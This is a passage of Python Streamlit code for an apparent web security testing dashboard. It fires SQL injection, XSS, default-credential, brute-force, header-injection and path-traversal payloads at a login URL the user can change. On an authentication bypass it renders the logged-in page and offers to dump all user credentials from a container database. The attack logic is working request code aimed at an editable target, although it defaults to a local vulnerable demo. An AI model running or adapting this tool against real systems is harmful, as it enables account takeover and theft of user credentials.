    ep = st.session_state[ep_key]
    st.markdown(
        f'<div style="font-family:JetBrains Mono,monospace;font-size:0.74rem;'
        f'color:#0284C7;background:#F0F9FF;border:1px solid #BAE6FD;'
        f'border-radius:6px;padding:6px 12px;margin-bottom:12px">'
        f'Target: <b>{ep["url"]}</b> · fields: <b>{ep["fields"][0]}</b> / '
        f'<b>{ep["fields"][1]}</b> · found at: {ep.get("found_path","?")}</div>',
        unsafe_allow_html=True,
    )
    if st.button("↻ Re-detect login page", key="las_reset", type="secondary"):
        del st.session_state[ep_key]
        st.session_state.pop(f"las_results_{state.get('job_id','')}", None)
        st.rerun()

    # ── Step 2: attack category cards ────────────────────────────────
    counts = {
        "sqli": len(SQLI_PAYLOADS), "xss": len(XSS_PAYLOADS),
        "creds": len(DEFAULT_CREDS), "brute": len(BRUTE_FORCE_PAYLOADS),
        "header": len(HEADER_PAYLOADS), "traversal": len(PATH_TRAVERSAL),
    }
    cols = st.columns(len(_ATTACK_CATEGORIES))
    chosen_cat = st.session_state.get("las_chosen_cat")
    for col, (cat, (icon, label, color, bg)) in zip(cols, _ATTACK_CATEGORIES.items()):
        with col:
            active = (chosen_cat == cat)
            border = color if active else "#E2E8F0"
            st.markdown(
                f'<div style="background:{bg};border:2px solid {border};'
                f'border-radius:10px;padding:10px;text-align:center;min-height:100px">'
                f'<div style="font-size:1.4rem">{icon}</div>'
                f'<div style="font-family:Inter,sans-serif;font-size:0.74rem;'
                f'font-weight:700;color:{color};margin:4px 0">{label}</div>'
                f'<div style="font-family:Inter,sans-serif;font-size:0.68rem;'
                f'color:#64748B">{counts[cat]} payloads</div>'
                f'</div>',
                unsafe_allow_html=True,
            )
            if st.button(f"Run {icon}", key=f"las_{cat}", use_container_width=True):
                st.session_state["las_chosen_cat"] = cat
                st.session_state.pop(f"las_results_{state.get('job_id','')}", None)
                st.rerun()

    # ── Run All button ────────────────────────────────────────────────
    if st.button("⚡ Run ALL 6 categories (180 attacks)", key="las_all", type="primary",
                 use_container_width=True):
        st.session_state["las_chosen_cat"] = "all"
        st.session_state.pop(f"las_results_{state.get('job_id','')}", None)
        st.rerun()

    # ── Execute attacks ───────────────────────────────────────────────
    res_key = f"las_results_{state.get('job_id','')}"
    cat = st.session_state.get("las_chosen_cat")

    if cat and res_key not in st.session_state:
        cats_to_run = list(_ATTACK_CATEGORIES) if cat == "all" else [cat]
        all_events: list[dict] = []

        # ── Live packet-capture terminal ──────────────────────────────
        st.markdown(_PCAP_CSS, unsafe_allow_html=True)
        st.markdown(
            '<div style="font-family:JetBrains Mono,monospace;font-size:.62rem;'
            'color:#60A5FA;letter-spacing:.12em;margin-bottom:4px">'
            '▸ LIVE ATTACK CONSOLE — REAL HTTP REQUESTS → RESPONSES</div>',
            unsafe_allow_html=True,
        )

        terminal = st.empty()
        live_rows: list[str] = []

        for cur_cat in cats_to_run:
            icon_c, label_c, color_c, _ = _ATTACK_CATEGORIES[cur_cat]
            # Category header row
            live_rows.append(
                f'<div class="las-row" style="color:#67E8F9;margin-top:8px">'
                f'{"═"*20} {icon_c} {label_c.upper()} {"═"*20}</div>'
            )
            terminal.markdown(
                f'<div class="las-term">{"".join(live_rows)}'
                f'<div class="las-blink las-req">_</div></div>',
                unsafe_allow_html=True,
            )

            evts: list[dict] = []
            try:
                if cur_cat == "sqli":
                    gen = run_sqli_attacks(ep)
                elif cur_cat == "xss":
                    gen = run_xss_attacks(ep)
                elif cur_cat == "creds":
                    gen = run_default_creds(ep)
                elif cur_cat == "brute":
                    gen = run_brute_force(ep)
                elif cur_cat == "header":
                    gen = run_header_attacks(base_url, ep)
                else:
                    gen = run_path_traversal(base_url)

                for ev in gen:
                    ev["category"] = cur_cat
                    evts.append(ev)
                    all_events.append(ev)
                    live_rows.append(_login_pcap_html(ev))
                    # Cap displayed rows to last 60 to avoid giant DOM
                    display_rows = live_rows[-60:]
                    terminal.markdown(
                        f'<div class="las-term" style="max-height:420px;overflow-y:auto">'
                        f'{"".join(display_rows)}'
                        f'<div class="las-blink las-req">█</div></div>',
                        unsafe_allow_html=True,
                    )

                crits = sum(1 for e in evts if e.get("verdict") in ("CRITICAL","HIGH"))
                summary_color = "#F87171" if crits else "#4ADE80"
                live_rows.append(
                    f'<div class="las-row" style="color:{summary_color};margin-top:4px">'
                    f'◉ {label_c}: {len(evts)} probes · '
                    f'{"⚡ " + str(crits) + " CRITICAL/HIGH" if crits else "✓ ALL SECURED"}'
                    f'</div>'
                )
            except Exception as exc:
                live_rows.append(
                    f'<div class="las-row" style="color:#FBBF24">⚠ {label_c} error: {exc}</div>'
                )

        # Final terminal state (no blinking cursor, done)
        terminal.markdown(
            f'<div class="las-term" style="max-height:420px;overflow-y:auto">'
            f'{"".join(live_rows[-80:])}'
            f'<div class="las-row" style="color:#4ADE80">▸ SCAN COMPLETE</div>'
            f'</div>',
            unsafe_allow_html=True,
        )
        st.session_state[res_key] = all_events

    # ── Show results + score ──────────────────────────────────────────
    if res_key in st.session_state:
        events = st.session_state[res_key]

        # ── Detect 404-only run (wrong target) ──────────────────────
        non_timeout = [e for e in events if e.get("verdict") not in ("TIMEOUT",)]
        # All events are either INFO (404 abort) or have status_code==404
        all_404_run = (non_timeout and
                       all(e.get("status_code") == 404 or e.get("verdict") == "INFO"
                           for e in non_timeout))

        if all_404_run:
            st.markdown(
                '<div style="background:#FFF7ED;border:2px solid #F59E0B;border-radius:10px;'
                'padding:14px 18px;margin-top:8px">'
                '<div style="font-family:Inter,sans-serif;font-size:0.9rem;font-weight:700;'
                'color:#92400E;margin-bottom:6px">'
                '⚠️ Wrong target — no login form at this URL</div>'
                '<div style="font-family:Inter,sans-serif;font-size:0.8rem;color:#78350F;line-height:1.7">'
                'All attacks returned <b>HTTP 404</b> — this container has no <code>/login</code> route.<br>'
                '<b>Fix:</b> Change the URL above to a container that has a real login form:<br>'
                '&nbsp;&nbsp;→ <b style="color:#DC2626">http://localhost:8102/login</b> '
                '(Vulnerable Flask Demo — SQLi, XSS, no rate-limit)<br>'
                '&nbsp;&nbsp;→ Or deploy your own app with a login page</div>'
                '</div>',
                unsafe_allow_html=True,
            )
            # Quick switch button
            if st.button("🎯 Switch to Vulnerable Demo (port 8102)", key="las_switch_demo",
                         type="primary"):
                _demo_ep = {
                    "url":    "http://localhost:8102/login",
                    "fields": ("username","password"),
                    "method": "POST",
                    "found_path": "(Vulnerable Flask Demo)",
                }
                st.session_state[ep_key] = _demo_ep
                st.session_state.pop(res_key, None)
                st.session_state.pop("las_chosen_cat", None)
                st.rerun()
        else:
            score_d = score_results(events)
            sc, lbl, sc_color = score_d["score"], score_d["label"], score_d["color"]
            bd = score_d["breakdown"]

            st.markdown("<div style='height:10px'></div>", unsafe_allow_html=True)
            k1, k2, k3, k4, k5 = st.columns(5)
            def _kpi2(col, lbl_t, val, color):
                col.markdown(
                    f'<div style="text-align:center;background:#F8FAFC;border:2px solid {color};'
                    f'border-radius:8px;padding:10px 4px">'
                    f'<div style="font-size:1.5rem;font-weight:700;color:{color}">{val}</div>'
                    f'<div style="font-size:0.68rem;color:#64748B;font-family:Inter,sans-serif">{lbl_t}</div>'
                    f'</div>', unsafe_allow_html=True,
                )
            _kpi2(k1, "Security Score", f"{sc}/100", sc_color)
            _kpi2(k2, "VERDICT",  lbl,                   sc_color)
            _kpi2(k3, "CRITICAL", bd.get("CRITICAL",0),   "#DC2626")
            _kpi2(k4, "HIGH",     bd.get("HIGH",0),        "#EA580C")
            _kpi2(k5, "SECURED",  bd.get("SECURED",0),     "#16A34A")

            # ── CRACKED banner (brute force found password) ──────────
            cracked_evts = [e for e in events if
                            e.get("verdict") == "CRITICAL" and
                            "CRACKED" in e.get("detail","") + e.get("message","")]
            if cracked_evts:
                ce = cracked_evts[0]
                st.markdown(
                    '<div style="background:#0F172A;border:2px solid #DC2626;border-radius:10px;'
                    'padding:16px 20px;margin-top:10px;text-align:center">'
                    '<div style="font-size:2rem;margin-bottom:6px">🔓</div>'
                    '<div style="font-family:JetBrains Mono,monospace;font-size:1.1rem;font-weight:700;'
                    'color:#F87171;letter-spacing:0.05em">PASSWORD CRACKED</div>'
                    f'<div style="font-family:JetBrains Mono,monospace;font-size:0.82rem;'
                    f'color:#FCD34D;margin-top:6px">{ce.get("detail","").split(chr(10))[0]}</div>'
                    '<div style="font-family:Inter,sans-serif;font-size:0.72rem;color:#64748B;margin-top:6px">'
                    'Run "Extract Credentials" below to dump the full database</div>'
                    '</div>',
                    unsafe_allow_html=True,
                )

            with st.expander(f"📋 Full results log ({len(events)} attacks)", expanded=False):
                st.markdown(
                    '<div style="background:#F8FAFC;border:1px solid #E2E8F0;'
                    'border-radius:8px;padding:10px;max-height:400px;overflow-y:auto">'
                    + "".join(_login_evt_html(e) for e in events)
                    + "</div>",
                    unsafe_allow_html=True,
                )

            # Highlight CRITICAL/HIGH findings
            crits = [e for e in events if e.get("verdict") in ("CRITICAL","HIGH")]
            if crits:
                st.markdown(
                    f'<div style="background:#FEF2F2;border:2px solid #DC2626;border-radius:10px;'
                    f'padding:14px 18px;margin-top:10px">'
                    f'<div style="font-family:Inter,sans-serif;font-size:0.82rem;font-weight:700;'
                    f'color:#DC2626;margin-bottom:8px">'
                    f'⚡ {len(crits)} CRITICAL/HIGH FINDINGS — App is VULNERABLE</div>'
                    + "".join(_login_evt_html(e) for e in crits)
                    + "</div>",
                    unsafe_allow_html=True,
                )

        if st.button("↻ Clear & re-run", key="las_clear"):
            st.session_state.pop(res_key, None)
            st.session_state.pop("las_chosen_cat", None)
            st.rerun()

    # ── PAYLOAD BROWSER + CREDENTIAL EXTRACTOR ───────────────────────
    st.markdown("<div style='height:6px'></div>", unsafe_allow_html=True)
    with st.expander("🔬 Payload Browser — see all payloads, pick any, fire selected", expanded=True):

        # ── Full payload tables, keyed by category ──────────────────
        _PB_ALL = {
            "sqli":  {"label":"💉 SQL Injection",  "type":"field",
                      "rows":[(p["payload"], p["what"]) for p in SQLI_PAYLOADS]},
            "xss":   {"label":"🪝 XSS",            "type":"field",
                      "rows":[(p["payload"], p["what"]) for p in XSS_PAYLOADS]},
            "creds": {"label":"🔑 Default Creds",  "type":"creds",
                      "rows":[(f'{p["username"]}', f'{p["password"]}', p.get("what","")) for p in DEFAULT_CREDS]},
            "brute": {"label":"🔨 Brute Force",    "type":"brute",
                      "rows":[(p.get("password", p.get("payload","")), p.get("what","")) for p in BRUTE_FORCE_PAYLOADS]},
            "header":{"label":"📡 Header Inject",  "type":"header",
                      "rows":[(f'{p["header"]}: {p["value"]}', p.get("what","")) for p in HEADER_PAYLOADS]},
            "traversal":{"label":"📂 Path Traversal","type":"traversal",
                      "rows":[(p.get("payload", p.get("path","")), p.get("what","")) for p in PATH_TRAVERSAL]},
        }

        import requests as _rq  # needed for probe + fire

        pb_col1, pb_col2 = st.columns([1, 3])

        with pb_col1:
            pb_cat_key = st.radio(
                "Category",
                options=list(_PB_ALL.keys()),
                format_func=lambda k: _PB_ALL[k]["label"],
                key="pb_cat_radio",
                label_visibility="collapsed",
            )

        with pb_col2:
            _pb_info     = _PB_ALL[pb_cat_key]
            _pb_rows     = _pb_info["rows"]
            _pb_type     = _pb_info["type"]
            _uf, _pf     = ep.get("fields", ("username","password"))
            _ep_url_auto = ep.get("url","")
            _n           = len(_pb_rows)

            # ── Editable attack target URL ────────────────────────────
            _pb_url_key = "pb_target_url_override"
            if _pb_url_key not in st.session_state:
                st.session_state[_pb_url_key] = _ep_url_auto

            _ep_url = st.text_input(
                "🎯 ATTACK TARGET  (edit to switch port/path)",
                value=st.session_state[_pb_url_key],
                key=_pb_url_key,
                help="All payloads fire at this URL. Change to http://localhost:8102/login for the Vulnerable Demo.",
            )
            _ep_url = (_ep_url or "").strip() or _ep_url_auto

            # ── Live probe — is this actually a login page? ──────────
            _probe_cache_key = f"_pb_probe_{_ep_url}"
            if _probe_cache_key not in st.session_state:
                try:
                    _pr = _rq.get(_ep_url, timeout=4, allow_redirects=True)
                    _pb_body = _pr.text.lower()
                    _has_form = "<form" in _pb_body or 'type="password"' in _pb_body or "password" in _pb_body[:500]
                    if _pr.status_code == 404:
                        st.session_state[_probe_cache_key] = (
                            "❌", "#DC2626",
                            f"HTTP 404 — no page at this URL · "
                            f"Try http://localhost:8102/login (Vulnerable Demo with real SQLi)"
                        )
                    elif _has_form:
                        st.session_state[_probe_cache_key] = (
                            "✅", "#16A34A",
                            f"HTTP {_pr.status_code} — login form found · ready to attack"
                        )
                    else:
                        st.session_state[_probe_cache_key] = (
                            "⚠️", "#F59E0B",
                            f"HTTP {_pr.status_code} — page exists but no login form detected"
                        )
                except Exception as _pe:
                    st.session_state[_probe_cache_key] = (
                        "❌", "#DC2626", f"Cannot connect — {str(_pe)[:80]}"
                    )
            _p_icon, _p_color, _p_msg = st.session_state[_probe_cache_key]
            st.markdown(
                f'<div style="background:{_p_color}18;border:2px solid {_p_color}55;'
                f'border-radius:8px;padding:8px 14px;margin-bottom:8px">'
                f'<div style="font-family:JetBrains Mono,monospace;font-size:0.8rem;font-weight:700;'
                f'color:{_p_color}">{_p_icon} {_ep_url}</div>'
                f'<div style="font-family:Inter,sans-serif;font-size:0.72rem;color:#64748B;margin-top:2px">'
                f'{_p_msg}</div></div>',
                unsafe_allow_html=True,
            )
            # Quick-switch button if demo not targeted
            if "8102" not in _ep_url:
                if st.button("⚡ Switch to Vulnerable Demo (port 8102)", key="pb_quick_switch_8102"):
                    st.session_state[_pb_url_key] = "http://localhost:8102/login"
                    st.session_state.pop(_probe_cache_key, None)
                    st.rerun()

            # ── Payload table header ──────────────────────────────────
            st.markdown(
                f'<div style="background:#1E293B;border-radius:6px;padding:6px 12px;margin-bottom:6px">'
                f'<span style="font-family:JetBrains Mono,monospace;font-size:0.7rem;color:#60A5FA;font-weight:700">'
                f'{_pb_info["label"]} — {_n} payloads</span>'
                f'</div>',
                unsafe_allow_html=True,
            )

            # ── Multiselect payload indices ──────────────────────────
            _sel_key = f"pb_sel_{pb_cat_key}"
            if _pb_type == "creds":
                _fmt = lambda i: f"#{i+1:02d}  {_pb_rows[i][0]}:{_pb_rows[i][1]:<14}  ← {_pb_rows[i][2][:38]}"
            else:
                _fmt = lambda i: f"#{i+1:02d}  {str(_pb_rows[i][0])[:50]:<52}  ← {str(_pb_rows[i][-1])[:36]}"

            sel_indices = st.multiselect(
                f"Select payloads (0 = run all {_n})",
                options=list(range(_n)),
                format_func=_fmt,
                key=_sel_key,
                placeholder=f"Pick from {_n} payloads — or leave empty to run all",
                label_visibility="collapsed",
            )

            # Show the actual code that will run
            _active_idx = sel_indices[0] if sel_indices else 0
            _sample_pl  = _pb_rows[_active_idx][0] if _pb_type != "creds" else f'{_pb_rows[_active_idx][0]}:{_pb_rows[_active_idx][1]}'
            if _pb_type == "field":   # sqli / xss
                _code_show = (
                    f'# Real HTTP POST — {len(sel_indices) or _n} payload(s) queued\n'
                    f'resp = requests.post("{_ep_url}",\n'
                    f'    data={{"{_uf}": "{_sample_pl}", "{_pf}": "x"}},\n'
                    f'    allow_redirects=False, timeout=5)\n'
                    f'# HTTP 302 = AUTH BYPASS (CRITICAL!)\n'
                    f'# HTTP 500 = SQL ERROR LEAKED (HIGH)\n'
                    f'# HTTP 200 = rejected (SECURED)'
                )
            elif _pb_type == "creds":
                _u0, _p0 = _pb_rows[_active_idx][0], _pb_rows[_active_idx][1]
                _code_show = (
                    f'# Default credential stuffing\n'
                    f'resp = requests.post("{_ep_url}",\n'
                    f'    data={{"{_uf}": "{_u0}", "{_pf}": "{_p0}"}},\n'
                    f'    allow_redirects=False, timeout=5)\n'
                    f'# HTTP 302 = logged in (CRITICAL!)\n'
                    f'# HTTP 200 = wrong creds (SECURED)'
                )
            elif _pb_type == "brute":
                _code_show = (
                    f'# Brute force — username="admin", cycling passwords\n'
                    f'for password in [{repr(_sample_pl)}, ...]:\n'
                    f'    resp = requests.post("{_ep_url}",\n'
                    f'        data={{"{_uf}": "admin", "{_pf}": password}},\n'
                    f'        allow_redirects=False, timeout=5)\n'
                    f'    if resp.status_code == 302:\n'
                    f'        print(f"CRACKED: admin / {{password}}")  # found!'
                )
            elif _pb_type == "header":
                _h0, _v0 = str(_pb_rows[_active_idx][0]).split(": ",1) if ": " in str(_pb_rows[_active_idx][0]) else (str(_pb_rows[_active_idx][0]), "")
                _code_show = (
                    f'# Malicious header injection\n'
                    f'resp = requests.get("{_ep_url}",\n'
                    f'    headers={{"{_h0}": "{_v0}"}},\n'
                    f'    timeout=5)\n'
                    f'# Check if header is reflected / causes error'
                )
            else:  # traversal
                _code_show = (
                    f'# Path traversal probe\n'
                    f'resp = requests.get(\n'
                    f'    f"{_ep_url}?file={_pb_rows[_active_idx][0]}",\n'
                    f'    timeout=5)\n'
                    f'if "root:x:" in resp.text:\n'
                    f'    print("/etc/passwd LEAKED! Path traversal confirmed")'
                )
            st.code(_code_show, language="python")

            # ── Fire button ──────────────────────────────────────────
            _n_to_fire = len(sel_indices) if sel_indices else _n
            f1, f2, f3 = st.columns([2, 1, 1])
            with f1:
                _fire_btn = st.button(
                    f"🎯 Fire {_n_to_fire} payload{'s' if _n_to_fire!=1 else ''}"
                    + (" (selected)" if sel_indices else f" (all {_n})"),
                    key="pb_fire_btn", type="primary", use_container_width=True
                )
            with f2:
                _custom_pl = st.text_input("Custom payload", value="",
                    key="pb_custom", placeholder="type your own",
                    label_visibility="collapsed")
            with f3:
                _custom_fire = st.button("🎯 Fire Custom", key="pb_custom_fire",
                                         use_container_width=True)

        # ── Execute selected / all / custom payloads ─────────────────
        def _fire_one(pl_str: str, pl_type: str, what: str = "") -> dict:
            """Send one payload, return result dict."""
            try:
                if pl_type == "creds":
                    _u, _p = (pl_str.split(":",1)+[""])[:2]
                    r = _rq.post(_ep_url, data={_uf: _u, _pf: _p},
                                  allow_redirects=False, timeout=6)
                elif pl_type in ("field","xss","sqli"):
                    r = _rq.post(_ep_url, data={_uf: pl_str, _pf: "x"},
                                  allow_redirects=False, timeout=6)
                elif pl_type == "brute":
                    r = _rq.post(_ep_url, data={_uf: "admin", _pf: pl_str},
                                  allow_redirects=False, timeout=6)
                elif pl_type == "header":
                    hdr, val = (pl_str.split(": ",1)+[""])[:2]
                    r = _rq.get(_ep_url, headers={hdr: val}, timeout=6)
                else:  # traversal
                    r = _rq.get(f"{_ep_url}?file={pl_str}", timeout=6)

                bypass  = r.status_code in (301,302) or any(
                    k in r.text.lower() for k in ("dashboard","welcome","logout","admin panel"))
                sqli_err= (r.status_code==500 or
                           any(e in r.text.lower() for e in ("sql","sqlite","syntax error","unclosed","ora-")))
                xss_ref = (pl_type in ("xss","field") and pl_str.lower() in r.text.lower())
                trav_ok = (pl_type=="traversal" and
                           any(k in r.text for k in ("root:x:","nobody:","daemon:")))

                if bypass:
                    verdict, vcolor = "CRITICAL", "#DC2626"
                elif sqli_err:
                    verdict, vcolor = "HIGH — SQL ERROR", "#EA580C"
                elif xss_ref:
                    verdict, vcolor = "HIGH — XSS REFLECTED", "#EA580C"
                elif trav_ok:
                    verdict, vcolor = "CRITICAL — FILE LEAKED", "#DC2626"
                else:
                    verdict, vcolor = "SECURED", "#16A34A"

                return {"pl": pl_str, "what": what, "status": r.status_code,
                        "verdict": verdict, "vcolor": vcolor,
                        "body_snip": r.text[:200],
                        "loc": r.headers.get("Location",""),
                        "bypass": bypass}
            except Exception as ex:
                return {"pl": pl_str, "what": what, "status": 0,
                        "verdict": "TIMEOUT", "vcolor": "#64748B",
                        "body_snip": str(ex), "loc": "", "bypass": False}

        def _render_pb_result(res: dict, idx: int):
            v, vc = res["verdict"], res["vcolor"]
            icon = {"CRITICAL":"🔴","HIGH — SQL ERROR":"🟠","HIGH — XSS REFLECTED":"🟠",
                    "CRITICAL — FILE LEAKED":"🔴","SECURED":"🟢","TIMEOUT":"⚪"}.get(v,"⚪")
            _pl_safe = str(res["pl"]).replace("<","&lt;").replace(">","&gt;")[:60]
            _loc_line = f' → {res["loc"]}' if res.get("loc") else ""
            st.markdown(
                f'<div style="display:flex;align-items:flex-start;gap:8px;padding:5px 10px;'
                f'border-left:3px solid {vc};background:#0F172A;border-radius:5px;margin-bottom:3px">'
                f'<span style="font-family:JetBrains Mono,monospace;font-size:0.62rem;color:#64748B;'
                f'flex-shrink:0;min-width:24px">#{idx+1:02d}</span>'
                f'<span style="font-family:JetBrains Mono,monospace;font-size:0.72rem;color:#E2E8F0;flex:1">'
                f'<b style="color:{vc}">{icon} {v}</b>  '
                f'HTTP {res["status"]}{_loc_line}<br>'
                f'<span style="color:#7DD3FC">{_pl_safe}</span>  '
                f'<span style="color:#64748B;font-size:0.62rem">{res["what"][:50]}</span>'
                f'</span></div>',
                unsafe_allow_html=True,
            )

        # ── Fire selected payloads ──────────────────────────────────
        if _fire_btn or _custom_fire:
            if _custom_fire and _custom_pl.strip():
                to_fire = [(_custom_pl.strip(), _pb_type, "custom payload")]
            elif sel_indices:
                if _pb_type == "creds":
                    to_fire = [(f'{_pb_rows[i][0]}:{_pb_rows[i][1]}', "creds", _pb_rows[i][2]) for i in sel_indices]
                else:
                    to_fire = [(_pb_rows[i][0], _pb_type, _pb_rows[i][-1]) for i in sel_indices]
            else:
                if _pb_type == "creds":
                    to_fire = [(f'{r[0]}:{r[1]}', "creds", r[2]) for r in _pb_rows]
                else:
                    to_fire = [(r[0], _pb_type, r[-1]) for r in _pb_rows]

            pb_results: list[dict] = []
            _prog_bar = st.progress(0, text=f"Firing {len(to_fire)} payloads…")
            _live_out = st.empty()
            _fired_html: list[str] = []

            for _i, (_pl, _pt, _wt) in enumerate(to_fire):
                _prog_bar.progress((_i+1)/len(to_fire), text=f"[{_i+1}/{len(to_fire)}] {str(_pl)[:40]}")
                _res = _fire_one(_pl, _pt, _wt)
                pb_results.append(_res)
                # Build live HTML row
                _v, _vc = _res["verdict"], _res["vcolor"]
                _ic = "🔴" if "CRITICAL" in _v else ("🟠" if "HIGH" in _v else ("🟢" if _v=="SECURED" else "⚪"))
                _pl_safe = str(_pl).replace("<","&lt;").replace(">","&gt;")[:50]
                _wt_safe = str(_wt).replace("<","&lt;").replace(">","&gt;")[:40]
                _fired_html.append(
                    f'<div style="display:flex;gap:8px;padding:4px 10px;border-left:2px solid {_vc};'
                    f'background:#0F172A;border-radius:4px;margin-bottom:2px;font-family:JetBrains Mono,monospace">'
                    f'<span style="color:#64748B;font-size:0.6rem;flex-shrink:0">#{_i+1:02d}</span>'
                    f'<span style="color:{_vc};font-size:0.68rem;font-weight:700;flex-shrink:0;min-width:80px">{_ic} {_v[:16]}</span>'
                    f'<span style="color:#7DD3FC;font-size:0.68rem;flex:1">{_pl_safe}</span>'
                    f'<span style="color:#475569;font-size:0.6rem">{_wt_safe}</span>'
                    f'</div>'
                )
                _live_out.markdown(
                    f'<div style="background:#0A1628;border:1px solid #1E3A5F;border-radius:8px;'
                    f'padding:8px;max-height:340px;overflow-y:auto">'
                    + "".join(_fired_html[-25:])
                    + '</div>',
                    unsafe_allow_html=True,
                )

            _prog_bar.empty()

            # Summary bar
            _crits  = sum(1 for r in pb_results if "CRITICAL" in r["verdict"])
            _highs  = sum(1 for r in pb_results if "HIGH" in r["verdict"])
            _bypass = [r for r in pb_results if r.get("bypass")]
            _sc     = "#DC2626" if _crits else ("#EA580C" if _highs else "#16A34A")
            st.markdown(
                f'<div style="background:{_sc}18;border:1px solid {_sc}44;border-radius:6px;'
                f'padding:8px 14px;margin-top:6px;font-family:Inter,sans-serif;font-size:0.78rem">'
                f'<b style="color:{_sc}">Fired {len(to_fire)} payloads against {_ep_url}</b> — '
                f'🔴 {_crits} CRITICAL · 🟠 {_highs} HIGH · '
                f'🟢 {len(pb_results)-_crits-_highs} SECURED</div>',
                unsafe_allow_html=True,
            )

            # ── Store security verdict in session state (for container badge) ──
            _any_404   = any(r.get("status") == 404 for r in pb_results)
            try:
                _ep_port_str = _ep_url.split("://")[1].split(":")[1].split("/")[0]
            except Exception:
                _ep_port_str = ""
            if _ep_port_str and not _any_404:
                _verdict_key = f"sec_verdict_{_ep_port_str}"
                if _crits > 0 or _highs > 0:
                    st.session_state[_verdict_key] = "VULNERABLE"
                elif len(pb_results) >= 5:
                    st.session_state[_verdict_key] = "SECURED"

            # ── Wrong-target detector ─────────────────────────────────
            _all_clean = _crits == 0 and _highs == 0
            if _all_clean and _any_404 and "8102" not in _ep_url:
                st.markdown(
                    '<div style="background:#FEF3C7;border:2px solid #F59E0B;border-radius:10px;'
                    'padding:12px 18px;margin-top:10px">'
                    '<div style="font-family:Inter,sans-serif;font-size:0.84rem;font-weight:700;'
                    'color:#B45309;margin-bottom:6px">⚠️ Wrong Target — HTTP 404s detected</div>'
                    '<div style="font-family:Inter,sans-serif;font-size:0.76rem;color:#78350F">'
                    f'All payloads hit <code>{_ep_url}</code> and got HTTP 404 — this URL has no login form.<br>'
                    'The Vulnerable Demo (real SQLi / brute-force target) is at '
                    '<b>http://localhost:8102/login</b></div></div>',
                    unsafe_allow_html=True,
                )
                if st.button("🎯 Switch to Vulnerable Demo → port 8102",
                             key="pb_wrong_tgt_switch", type="primary"):
                    st.session_state["pb_target_url_override"] = "http://localhost:8102/login"
                    st.session_state.pop(f"_pb_probe_{_ep_url}", None)
                    st.rerun()

            # ── Visual response preview for first bypass ──────────────
            if _bypass:
                _bpr  = _bypass[0]
                _snip = _bpr.get("body_snip","")
                _loc  = _bpr.get("loc","")
                _pl_bypass = _bpr.get("pl","")
                _bypass_type = _bpr.get("pl","")

                # Try to follow redirect and get the actual post-login page
                _dash_html = ""
                if _loc:
                    try:
                        from urllib.parse import urljoin
                        _sess2 = _rq.Session()
                        # Re-fire the bypassing payload with session (to keep cookie)
                        if _pb_type in ("field","sqli","xss"):
                            _sess2.post(_ep_url,
                                        data={_uf: _pl_bypass, _pf: "x"},
                                        allow_redirects=False, timeout=5)
                        elif _pb_type == "brute":
                            _sess2.post(_ep_url,
                                        data={_uf: "admin", _pf: _pl_bypass},
                                        allow_redirects=False, timeout=5)
                        elif _pb_type == "creds":
                            _u2, _p2 = (_pl_bypass.split(":",1)+[""])[:2]
                            _sess2.post(_ep_url,
                                        data={_uf: _u2, _pf: _p2},
                                        allow_redirects=False, timeout=5)
                        _dash_url = urljoin(_ep_url, _loc)
                        _dash_r = _sess2.get(_dash_url, timeout=5)
                        _dash_html = _dash_r.text
                    except Exception:
                        _dash_html = ""

                # Show bypass result
                st.markdown(
                    f'<div style="background:#0F172A;border:2px solid #DC2626;border-radius:8px;'
                    f'padding:10px 14px;margin-top:8px">'
                    f'<div style="font-family:JetBrains Mono,monospace;font-size:0.7rem;'
                    f'font-weight:700;color:#F87171;margin-bottom:6px">'
                    f'🔴 AUTH BYPASS — HTTP {_bpr["status"]}'
                    + (f' → Redirected to: <span style="color:#FCD34D">{_loc}</span>' if _loc else '') +
                    f'<br><span style="color:#94A3B8;font-weight:400">Payload: '
                    f'<span style="color:#7DD3FC">{str(_pl_bypass)[:60].replace("<","&lt;").replace(">","&gt;")}</span>'
                    f'</span></div>'
                    f'<pre style="font-family:JetBrains Mono,monospace;font-size:0.62rem;'
                    f'color:#86EFAC;white-space:pre-wrap;overflow-x:auto;'
                    f'background:#020617;padding:8px;border-radius:4px;'
                    f'max-height:120px;overflow-y:auto;margin:0">'
                    + (_snip.replace("&","&amp;").replace("<","&lt;").replace(">","&gt;") or "(no response body)")
                    + '</pre></div>',
                    unsafe_allow_html=True,
                )

                # Render the actual post-login page if we got it
                if _dash_html:
                    st.markdown(
                        '<div style="margin-top:8px;font-family:Inter,sans-serif;font-size:0.78rem;'
                        'font-weight:700;color:#DC2626">👇 What the server shows after login '
                        '(live rendered — attacker is now inside):</div>',
                        unsafe_allow_html=True,
                    )
                    import streamlit.components.v1 as _stc
                    _stc.html(_dash_html, height=280, scrolling=True)

                # Invalidate probe cache so next render re-probes
                st.session_state.pop(f"_pb_probe_{_ep_url}", None)

            # ── CREDENTIAL EXTRACTOR ────────────────────────────────
            if _bypass:
                st.markdown(
                    '<div style="background:#FEF2F2;border:2px solid #DC2626;border-radius:8px;'
                    'padding:10px 14px;margin-top:8px">'
                    '<div style="font-family:Inter,sans-serif;font-size:0.8rem;font-weight:700;'
                    'color:#DC2626;margin-bottom:4px">⚡ AUTH BYPASS confirmed — extract real credentials from the DB?</div>'
                    '<div style="font-family:Inter,sans-serif;font-size:0.74rem;color:#475569">'
                    'Will docker exec into the container, find the database, dump all user credentials.</div>'
                    '</div>',
                    unsafe_allow_html=True,
                )
                _clone_id = result.get("clone_id","")
                if st.button("🔓 Extract Credentials from Container DB", key="pb_extract_creds",
                             type="primary"):
                    with st.spinner("docker exec → scanning DB…"):
                        _cred_rows = _extract_creds_from_container(_clone_id, _ep_url)

                    if _cred_rows:
                        st.markdown(
                            '<div style="background:#0F172A;border:2px solid #DC2626;border-radius:8px;'
                            'padding:10px 14px;margin-top:8px">'
                            '<div style="font-family:JetBrains Mono,monospace;font-size:0.7rem;'
                            'font-weight:700;color:#F87171;margin-bottom:8px">'
                            '🔓 CREDENTIALS EXTRACTED FROM DATABASE</div>'
                            + "".join(
                                f'<div style="font-family:JetBrains Mono,monospace;font-size:0.76rem;'
                                f'padding:4px 8px;border-left:2px solid #DC2626;margin-bottom:2px;'
                                f'background:rgba(220,38,38,0.06)">'
                                f'<span style="color:#F87171">username:</span> '
                                f'<span style="color:#FCD34D">{str(cr.get("username","?"))[:40]}</span>  '
                                f'<span style="color:#F87171">password:</span> '
                                f'<span style="color:#4ADE80">{str(cr.get("password","?"))[:40]}</span>'
                                f'  <span style="color:#64748B;font-size:0.62rem">{cr.get("source","")}</span>'
                                f'</div>'
                                for cr in _cred_rows
                            )
                            + '</div>',
                            unsafe_allow_html=True,
                        )
                    else:
